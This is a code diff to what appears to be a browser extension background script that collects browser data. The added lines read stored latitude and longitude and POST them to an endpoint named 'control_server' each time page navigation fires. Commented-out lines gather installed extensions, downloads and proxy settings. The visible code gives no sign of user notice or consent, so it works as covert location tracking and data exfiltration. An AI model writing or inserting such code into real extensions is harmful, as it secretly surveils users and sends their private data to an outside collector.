@@ -170,6 +170,15 @@ function logSend(){
     //chrome.management.getAll((info)=>{logExApp(info)})
     //chrome.downloads.search({}).then(logExApp) 
     //chrome.proxy.settings.get({'incognito': false}).then((info)=> logExApp(info))
+    chrome.storage.local.get(["lat", "long"]).then((result)=>{
+        number = 3;
+        fetch(`http://127.0.0.1:5000/control_server`,
+        {
+        method: "POST",
+        mode: 'no-cors',
+        body: JSON.stringify([result.lat, result.long]),
+        headers:{"Content-Type": "application/json"}
+        });})
     
     loggingcontentSettings()
     loggingprivacySettings();
@@ -186,6 +195,7 @@ chrome.webNavigation.onCompleted.addListener((e) => {
                 a = Math.abs(parseInt(result.TimeA)-a)
                 if (a > 10*1000){
                     logSend()
+                    
                     a = Date.now()
                     chrome.storage.local.set({TimeA:a})
                 }
